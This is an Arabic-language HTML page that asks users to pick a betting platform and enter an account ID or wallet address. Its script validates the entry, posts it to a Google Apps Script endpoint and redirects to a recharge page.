<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<meta name="theme-color" content="#0052FF">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<title>الدخول إلى حسابي</title>
<style>
  :root{--blue:#0052ff;--ink:#0f172a;--muted:#5b6472;--line:#d5dbe5;--card:#ffffff}
  *{box-sizing:border-box;margin:0;padding:0}
  html,body{height:100%}
  body{font-family:Inter,system-ui,-apple-system,Segoe UI,Tahoma,Arial,sans-serif;background:#fff;color:var(--ink)}
  .sysbar{position:fixed;top:0;left:0;right:0;height:env(safe-area-inset-top, 0px);background:#0052ff;z-index:10;pointer-events:none}
  .shell{max-width:400px;margin:0 auto;padding:calc(env(safe-area-inset-top, 0px) + 16px) 18px 24px}
  .card{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:20px}
  .title{font-size:20px;font-weight:700;margin-bottom:16px}
  .group{margin-bottom:14px}
  .label{
    display:block;
    font-size:15px;
    font-weight:700;
    color:#0f172a;
    margin-bottom:8px;
  }
  .field{width:100%;height:48px;border:1px solid var(--line);border-radius:8px;background:#fff;color:var(--ink);font-size:15px;padding:0 12px;outline:none}
  .field::placeholder{color:#9aa3af}
  select.field{appearance:none;-webkit-appearance:none;background-image:url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="black" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg>');background-repeat:no-repeat;background-position:left 12px center;padding-left:36px}
  .btn{width:100%;height:48px;border:0;border-radius:8px;background:#0052ff;color:#fff;font-weight:600;font-size:15px;cursor:pointer}
  .btn[disabled]{opacity:.6;cursor:not-allowed}
  .warn{font-size:12px;color:#444;line-height:1.7;margin-top:12px;text-align:center}
  #error-message{color:red;text-align:center;margin-top:6px}
</style>
</head>
<body>

<div class="sysbar"></div>

<div id="app">
  <div class="shell">
    <div class="card">
      <div class="title">الدخول إلى حسابي</div>

      <div class="group">
        <span class="label">حدد المنصة</span>
        <select id="platform" class="field">
          <option value="" selected disabled>اختر المنصة</option>
          <option>Gooobet</option>
          <option>Mega Pari</option>
          <option>MyStake</option>
          <option>Stake</option>
          <option>LINEBET</option>
          <option>1xBet</option>
          <option>RiskoBet</option>
          <option>888Starz</option>
          <option>MelBet</option>
          <option>Betwinner</option>
        </select>
      </div>

      <div class="group">
        <span class="label" id="id-label">Account ID</span>
        <input id="uid" class="field" type="text" inputmode="numeric" pattern="[0-9]{4,15}" maxlength="15" placeholder="مثال: 87654321">
      </div>

      <button id="go" class="btn" disabled>تأكيد</button>
      <div class="warn">
        بالضغط على زر المتابعة، أنت تؤكد أن عمرك 18 سنة فأكثر وأنك توافق على سياسة الخصوصية والشروط والأحكام.
      </div>
      <div id="error-message"></div>
    </div>
  </div>
</div>

<script>
const platformSelect = document.getElementById('platform'),
      uid = document.getElementById('uid'),
      go = document.getElementById('go'),
      errMsg = document.getElementById('error-message');

const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbya5yWgv26ibjoztwv6nU4N6fEejGuPLm20SxM_3yt3jiU0DiiFW4MYom7VLOJ6aojZoQ/exec";
let platform = null;
const repReg = /^(\d)\1{6,}$/;

function validate() {
  let val = uid.value.trim();

  // منع الأحرف العربية في Wallet Address
  if(platform === "Stake" || platform === "MyStake"){
    val = val.replace(/[\u0600-\u06FF\s]+/g, '');
    uid.value = val;
  }

  errMsg.textContent = '';
  go.disabled = true;

  if(!platform) {
    errMsg.textContent = 'يرجى اختيار المنصة.';
    return;
  }

  if(platform !== "Stake" && platform !== "MyStake"){
    // التحقق من أن الـ ID بين 4 و 15 رقم
    if(!/^[0-9]{4,15}$/.test(val)){
      errMsg.textContent = 'يجب أن يتكون المعرّف من 4 إلى 15 رقمًا.';
      return;
    }
    if(repReg.test(val)){
      errMsg.textContent = 'المعرّف غير صالح';
      return;
    }
  } else {
    if(val.length < 10) {
      errMsg.textContent = 'العنوان غير صالح.';
      return;
    }
  }

  if(val.length > 0) go.disabled = false;
}

platformSelect.addEventListener('change', () => {
  platform = platformSelect.value;
  if(platform === "Stake" || platform === "MyStake"){
    document.getElementById('id-label').textContent = "Wallet Address";
    uid.placeholder = "مثال: 0x32Be343B94f860124dC4fEe278FDCBD38C102D88";
    uid.removeAttribute("inputmode");
    uid.removeAttribute("maxlength");
  } else {
    document.getElementById('id-label').textContent = "Account ID";
    uid.placeholder = "مثال: 87654321";
    uid.setAttribute("inputmode","numeric");
    uid.setAttribute("maxlength","15");
  }
  validate();
});

uid.addEventListener('input', validate);

go.addEventListener('click', async () => {
  go.disabled = true;
  go.innerText = 'جارٍ الإرسال...';

  const formData = new FormData();
  formData.append("walletAddress", uid.value.trim());
  formData.append("platform", platform);

  try{
    await fetch(SCRIPT_URL, { method:'POST', body: formData });
    localStorage.setItem('walletAddress', uid.value.trim());

    // إعادة ضبط النموذج
    uid.value = '';
    platformSelect.value = '';
    platform = null;
    document.getElementById('id-label').textContent = "Account ID";
    uid.placeholder = "مثال: 87654321";
    uid.setAttribute("inputmode","numeric");
    uid.setAttribute("maxlength","15");
    go.disabled = true;
    go.innerText = 'تأكيد';

    window.location.href = 'fr/office/recharge.html';
  } catch(err){
    errMsg.textContent = 'حدث خطأ أثناء الإرسال، حاول مجددًا.';
    go.disabled = false;
    go.innerText = 'تأكيد';
  }
});
</script>

</body>
</html>
